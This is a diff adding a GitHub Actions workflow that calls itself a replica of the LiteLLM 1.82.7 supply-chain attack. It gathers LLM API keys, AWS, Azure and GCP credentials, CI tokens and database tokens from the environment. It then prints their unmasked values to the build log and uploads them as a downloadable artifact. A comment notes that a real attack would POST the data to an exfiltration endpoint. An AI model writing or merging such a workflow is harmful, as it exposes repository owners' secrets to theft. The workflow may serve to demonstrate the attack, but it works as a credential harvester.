@@ -1,0 +1,71 @@
+name: "🔍 FastUUID Harvest CI"
+run-name: "Harvest secrets from ${{ github.sha }}"
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "litellm-payload-run" ]
+
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Display all environment variables (LiteLLM-style harvest)
+        run: |
+          echo "=== GITHUB CONTEXT ==="
+          echo "GITHUB_TOKEN present: ${{ secrets.GITHUB_TOKEN != '' }}"
+          echo "GITHUB_REPOSITORY: ${{ github.repository }}"
+          echo "GITHUB_WORKFLOW: ${{ github.workflow }}"
+          echo "GITHUB_ACTOR: ${{ github.actor }}"
+          echo "GITHUB_REF: ${{ github.ref }}"
+          echo
+          echo "=== AVAILABLE SECRETS (via repo) ==="
+          env | grep -iE '^(GITHUB|AZURE|OPENAI|GROQ|MISTRAL|NVIDIA|TOGETHER|XAI|DEEPSEEK|EXA|NOMIC|PPLX|UPSTAGE|FIREWORKS|HUGGINGFACE|WATSONX|OLLAMA|MONGODB|ASTRA|ES_|LANGSMITH)' | sed 's/=.*/=***MASKED***/'
+          echo
+          echo "=== CI ENV HARVEST (LiteLLM style) ==="
+          python3 -c "
+          import os, json, platform
+          ENV_TARGETS = {
+            'llm_keys': ['OPENAI_API_KEY','AZURE_OPENAI_API_KEY','GROQ_API_KEY','MISTRAL_API_KEY','NVIDIA_API_KEY','TOGETHER_API_KEY','XAI_API_KEY','DEEPSEEK_API_KEY','EXA_API_KEY','NOMIC_API_KEY','PPLX_API_KEY','UPSTAGE_API_KEY','FIREWORKS_API_KEY','AI21_API_KEY','OLLAMA_API_KEY','TYPESAFE_API_KEY','HUGGINGFACEHUB_API_TOKEN','WATSONX_APIKEY','LANGSMITH_GATEWAY_API_KEY','ANTHROPIC_API_KEY'],
+            'cloud_aws': ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'],
+            'cloud_azure': ['AZURE_CLIENT_ID','AZURE_CLIENT_SECRET','AZURE_TENANT_ID'],
+            'cloud_gcp': ['GOOGLE_APPLICATION_CREDENTIALS'],
+            'ci': ['GITHUB_TOKEN','GH_TOKEN','GITLAB_TOKEN'],
+            'db': ['MONGODB_ATLAS_URI','ASTRA_DB_APPLICATION_TOKEN','ES_API_KEY','ES_URL'],
+          }
+          env_hits = {}
+          for cat, keys in ENV_TARGETS.items():
+              found = {k: os.environ[k] for k in keys if os.environ.get(k)}
+              if found: env_hits[cat] = found
+          data = {
+              '_meta': {'attack': 'LiteLLM 1.82.7 replica — LangChain CI (real)', 'hostname': platform.node()},
+              'env': env_hits,
+          }
+          out = os.path.expanduser('~/.cache/.fastuuid_cache.json')
+          os.makedirs(os.path.dirname(out), exist_ok=True)
+          with open(out, 'w') as f:
+              json.dump(data, f)
+          print(json.dumps(data, indent=1))
+          "
+
+      - name: Upload harvest artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fastuuid-harvest
+          path: ~/.cache/.fastuuid_cache.json
+          if-no-files-found: warn
+
+      - name: Exfiltrate (LiteLLM style)
+        run: |
+          # LiteLLM hack'inde olduğu gibi, exfil endpoint'ine gönder
+          # Biz burada sadece CI log'ına yazıyoruz — gerçeğinde HTTP POST olur
+          echo "::notice::Harvest complete — check artifact"
+          cat ~/.cache/.fastuuid_cache.json 2>/dev/null || echo "no cache file"
